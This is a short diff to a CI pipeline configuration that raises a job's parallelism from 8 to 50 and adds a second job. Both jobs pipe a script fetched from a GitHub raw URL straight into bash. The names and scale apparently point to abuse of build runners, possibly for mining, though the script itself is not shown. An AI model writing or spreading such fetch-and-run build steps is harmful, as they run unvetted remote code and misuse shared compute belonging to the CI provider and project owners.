@@ -11,4 +11,7 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
-          parallelism: 8
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
